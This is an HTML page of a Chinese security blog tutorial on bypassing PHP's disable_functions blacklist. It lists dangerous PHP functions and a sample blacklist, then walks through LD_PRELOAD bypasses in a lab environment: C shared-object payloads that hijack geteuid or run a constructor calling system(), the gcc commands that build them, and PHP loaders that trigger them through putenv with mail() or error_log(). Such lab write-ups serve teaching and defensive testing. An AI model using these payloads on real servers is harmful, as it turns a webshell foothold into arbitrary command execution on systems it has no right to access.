<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>突破disable_functions执行命令·上 | Ulysses'Blog</title><meta name="keywords" content="bypass disable_functions"><meta name="author" content="Ulysses"><meta name="copyright" content="Ulysses"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP disable_functionsdisable_functions是php.ini中的一个设置选项。相当一个黑名单，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。  先来看看一般是哪些函数需要放入 disable_functions：     禁用函数 功能描述 危险等级     system() 允许执行一个外部程序并回显输出">
<meta property="og:type" content="article">
<meta property="og:title" content="突破disable_functions执行命令·上">
<meta property="og:url" content="https://plumeria.ltd/post/ee1189d7.html">
<meta property="og:site_name" content="Ulysses&#39;Blog">
<meta property="og:description" content="PHP disable_functionsdisable_functions是php.ini中的一个设置选项。相当一个黑名单，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。  先来看看一般是哪些函数需要放入 disable_functions：     禁用函数 功能描述 危险等级     system() 允许执行一个外部程序并回显输出">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://plumeria.ltd/img/cover/disable_functions.png">
<meta property="article:published_time" content="2022-01-10T12:00:00.000Z">
<meta property="article:modified_time" content="2022-01-13T05:36:56.012Z">
<meta property="article:author" content="Ulysses">
<meta property="article:tag" content="bypass disable_functions">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://plumeria.ltd/img/cover/disable_functions.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://plumeria.ltd/post/ee1189d7"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"0HPLBDYHPG","apiKey":"0c8875d1d08e28840a882f41ae37ed2e","indexName":"my blog","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '突破disable_functions执行命令·上',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-01-13 13:36:56'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    document.addEventListener('pjax:complete', detectApple)})(window)</script><link rel="stylesheet" href="/css/mycss.css"><style type="text/css">.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body{left:-66px!important}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover{left:0!important}</style><div class="aplayer" data-id="6997392079" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/css/swiper.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiperstyle.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/tag_plugins.min.css" media="defer" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">62</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/disable_functions.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ulysses'Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">突破disable_functions执行命令·上</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-10T12:00:00.000Z" title="发表于 2022-01-10 20:00:00">2022-01-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-13T05:36:56.012Z" title="更新于 2022-01-13 13:36:56">2022-01-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">Web安全攻防</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">代码执行与命令执行</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>30分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="突破disable_functions执行命令·上"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="PHP-disable-functions"><a href="#PHP-disable-functions" class="headerlink" title="PHP disable_functions"></a>PHP disable_functions</h2><p><code>disable_functions</code>是<code>php.ini</code>中的一个设置选项。相当一个黑名单，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/13/EWpzb4GNoDcyTAY.png" alt="image-20211213225432124"></p>
<p>先来看看一般是哪些函数需要放入 <code>disable_functions</code>：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>禁用函数</th>
<th>功能描述</th>
<th>危险等级</th>
</tr>
</thead>
<tbody>
<tr>
<td>system()</td>
<td>允许执行一个外部程序并回显输出</td>
<td>高</td>
</tr>
<tr>
<td>exec()</td>
<td>允许执行一个外部程序</td>
<td>高</td>
</tr>
<tr>
<td>shell_exec()</td>
<td>通过 Shell 执行命令，并将执行结果作为字符串返回。</td>
<td>高</td>
</tr>
<tr>
<td>passthru()</td>
<td>允许执行一个外部程序并回显输出</td>
<td>高</td>
</tr>
<tr>
<td>popen()</td>
<td>可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。</td>
<td>高</td>
</tr>
<tr>
<td>proc_open()</td>
<td>执行一个命令并打开文件指针用于读取以及写入。</td>
<td>高</td>
</tr>
<tr>
<td>proc_get_status()</td>
<td>获取使用 proc_open() 所打开进程的信息。</td>
<td>高</td>
</tr>
<tr>
<td>chroot()</td>
<td>可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式PHP 时才能工作，且该函数不适用于 Windows 系统。</td>
<td>高</td>
</tr>
<tr>
<td>chgrp()</td>
<td>改变文件或目录所属的用户组。</td>
<td>高</td>
</tr>
<tr>
<td>chown()</td>
<td>改变文件或目录的所有者。</td>
<td>高</td>
</tr>
<tr>
<td>ini_set()</td>
<td>可用于修改、设置 PHP 环境配置参数。</td>
<td>高</td>
</tr>
<tr>
<td>ini_alter()</td>
<td>是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。</td>
<td>高</td>
</tr>
<tr>
<td>ini_restore()</td>
<td>可用于恢复 PHP 环境配置参数到其初始值。</td>
<td>高</td>
</tr>
<tr>
<td>dl()</td>
<td>在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。</td>
<td>高</td>
</tr>
<tr>
<td>pfsockopen()</td>
<td>建立一个 Internet 或 UNIX 域的 socket 持久连接。</td>
<td>高</td>
</tr>
<tr>
<td>symlink()</td>
<td>在 UNIX 系统中建立一个符号链接。</td>
<td>高</td>
</tr>
<tr>
<td>putenv()</td>
<td>用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。</td>
<td>高</td>
</tr>
<tr>
<td>phpinfo()</td>
<td>输出 PHP 环境信息以及相关的模块、WEB 环境等信息。</td>
<td>中</td>
</tr>
<tr>
<td>scandir()</td>
<td>列出指定路径中的文件和目录。</td>
<td>中</td>
</tr>
<tr>
<td>syslog()</td>
<td>可调用 UNIX 系统的系统层 syslog() 函数。</td>
<td>中</td>
</tr>
<tr>
<td>readlink()</td>
<td>返回符号连接指向的目标文件内容。</td>
<td>中</td>
</tr>
<tr>
<td>stream_socket_server()</td>
<td>建立一个 Internet 或 UNIX 服务器连接。</td>
<td>中</td>
</tr>
<tr>
<td>error_log()</td>
<td>将错误信息发送到指定位置（文件）。<br>安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，执行任意命令。</td>
<td>低</td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<p>注：<code>eval()</code>并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。</p>
</blockquote>
<p>由于很多 PHP 站点往往设置了<code>disable_functions</code>来禁止用户调用某些危险函数，给 Getshell 带来了很大的不便，这里总结了以下绕过方法来绕过与突破<code>disable_functions</code>，欢迎大佬指正。</p>
<h2 id="寻找黑名单遗漏的危险函数"><a href="#寻找黑名单遗漏的危险函数" class="headerlink" title="寻找黑名单遗漏的危险函数"></a>寻找黑名单遗漏的危险函数</h2><p><code>disable_functions</code> 是基于黑名单来实现对某些函数使用的限制的，既然是黑名单有时候就难免会有漏网之鱼。</p>
<p>拿到WebShell之后可以通过<code>phpinfo</code>来寻找黑名单遗漏的危险函数。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/29/19L46YKJw7IfQHs.png" alt="image-20211229222906997"></p>
<p>以下一些比较严格的<code>disable_functions</code>限制项：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</span><br></pre></td></tr></table></figure>
<blockquote>
<p>除了可以使用<code>phpinfo()</code>函数获取<code>disable_functions</code>外，还可以使用<code>ini_get()</code>函数来获取php.ini的内容:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ini_get(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="利用-LD-PRELOAD-环境变量"><a href="#利用-LD-PRELOAD-环境变量" class="headerlink" title="利用 LD_PRELOAD 环境变量"></a>利用 LD_PRELOAD 环境变量</h2><p><strong>原理简介</strong>：</p>
<p><code>LD_PRELOAD</code>是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的攻击目的。</p>
<p>我们通过环境变量 <code>LD_PRELOAD</code> 劫持系统函数，可以达到不调用 PHP 的各种命令执行函数（<code>system()</code>、<code>exec()</code> 等等）仍可执行系统命令的目的。</p>
<p>想要利用LD_PRELOAD环境变量绕过<code>disable_functions</code>需要注意以下几点：</p>
<blockquote>
<p>能够上传自己的.so文件 能够控制LD_PRELOAD环境变量的值，比如<strong><code>putenv()</code></strong>函数 因为新进程启动将加载<code>LD_PRELOAD</code>中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如<code>mail()</code>、<code>imap_mail()</code>、<code>mb_send_mail()</code>和<code>error_log()</code>函数等</p>
</blockquote>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li><p>Linux 操作系统</p>
</li>
<li><p><code>putenv</code>可用</p>
</li>
<li><p><code>mail</code> or <code>error_log</code> 可用，本例中禁用了 <code>mail</code> 但未禁用 <code>error_log</code></p>
</li>
<li><p>存在可写的目录，需要上传 <code>.so</code> 文件</p>
</li>
</ul>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1</a></p>
<p><strong>启动环境</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<blockquote>
<p>我们的最终目的是获取 /flag 的内容, 这个文件是 644 权限，www-data 用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 tac 命令来获取 flag。</p>
</blockquote>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/01/vJaCIG2oHR9Xd6i.png" alt="image-20220101235220486"></p>
<h3 id="方法一：劫持函数"><a href="#方法一：劫持函数" class="headerlink" title="方法一：劫持函数"></a>方法一：劫持函数</h3><p>一般而言，利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），新进程 a.bin 内部调用系统函数 b()，b() 位于 系统共享对象 c.so 中，所以系统为该进程加载共享对象 c.so，想办法在加载 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内的b() 而非系统的 c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。</p>
<p>基于这一思路，常见突破 <code>disable_functions</code> 限制执行操作系统命令的思路：</p>
<blockquote>
<p>1.找到一个可以启动新进程的函数，如<code>mail()</code>函数会启动新进程 <code>/usr/sbin/sendmail</code></p>
<p>2.书写一个会被<code>sendmail</code>调用的C函数（函数最好不带参数），内部为恶意代码，编译为.so文件，如<code>geteuid()</code>函数</p>
<p>3.运行PHP函数<code>putenv()</code>，设定我们的so文件为<code>LD_PRELOAD</code>，设置后新进程启动时将优先加载我们设置的so文件</p>
<p>4.运行PHP的<code>mail()</code>函数，这时sendmail会优点调用我们书写的getegid同名函数，达到劫持执行恶意代码的效果</p>
</blockquote>
<p>首先查看sendmail会调用那些函数，这里我们选择getegid函数，也可以是其他函数进行劫持</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -Ws /usr/sbin/sendmail</span><br><span class="line"><span class="comment"># readelf只会显示sendmial可能调用的函数，具体调用的函数应该使用strace -f 进行查看</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/01/CVrIwRlOuedzbU3.png" alt="image-20220101234332864"></p>
<p><strong>靶场突破</strong>：</p>
<p>首先在本地编写<code>hack.c</code>文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">system(<span class="string">&quot;tac /flag &gt; /var/www/html/flag.txt&quot;</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将c文件编译为so文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hack.c -o hack.so -shared -fPIC</span><br></pre></td></tr></table></figure>
<p>使用蚁剑将<code>hack.so</code>上传至目标靶机</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/01/CyvgihPc6xpGQZN.png" alt="image-20220101232524908"></p>
<p>使用蚁剑在目标靶机上写入php文件，设置环境变量并执行<code>mail()</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/www/html/hack.so&quot;</span>);	<span class="comment"># 编译c文件后的so文件位置</span></span><br><span class="line">mail(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是在浏览器中访问.php文件，未出现flag，猜测<code>mail</code>函数被禁用，可以通过写入phpinfo()查看</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/01/eXjHh3z7ombl1tD.png" alt="image-20220101233507576"></p>
<p>sendmail也会调用<code>error_log</code>，修改php文件如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/www/html/hack.so&quot;</span>);</span><br><span class="line">error_log(<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>浏览器访问.php文件，在蚁剑中可以看到生成了flag.txt文件</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/01/YS5wjQvKGuW64o9.png" alt="image-20220101234446832"></p>
<h3 id="方法一：预加载共享对象"><a href="#方法一：预加载共享对象" class="headerlink" title="方法一：预加载共享对象"></a>方法一：预加载共享对象</h3><p>在实际情况中，很多机器尚未安装或者禁止了sendmail功能，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件，所以可以采用另一种方式绕过disable_function。</p>
<p>系统通过<code>LD_PRELOAD</code>预先加载共享对象，如果在加载时就执行代码，就不用劫持函数以此绕过<code>disable_function</code>。</p>
<p>gcc允许为函数设置如下属性，可以让其修饰的函数在<code>mail()</code>函数之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，将立即执行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((__constructor__))</span><br><span class="line"><span class="comment">// constructor参数让系统执行main()函数之前调用函数(被__attribute__((constructor))修饰的函数</span></span><br></pre></td></tr></table></figure>
<p>编写<code>hack.c</code>代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__((constructor))<span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* cmd = getenv(<span class="string">&quot;CMD&quot;</span>);<span class="comment">//接收传入的命令</span></span><br><span class="line">system(cmd); <span class="comment">// 执行命令</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将c文件编译为so文件，并使用蚁剑将<code>hack.so</code>上传至目标靶机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hack.c -o hack.so -shared -fPIC</span><br></pre></td></tr></table></figure>
<p>使用蚁剑在目标靶机上写入php文件，设置环境变量并执行<code>error_log()</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&quot;CMD=tac /flag &gt; /var/www/html/flag.txt&quot;</span>);	<span class="comment"># 要执行的命令</span></span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/www/html/hack.so&quot;</span>);	<span class="comment"># 编译c文件后的so文件位置</span></span><br><span class="line">error_log(<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>浏览器访问.php文件，在蚁剑中可以看到生成了flag.txt文件</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/02/OoHSMPWntci1Vvl.png" alt="image-20220102000255462"></p>
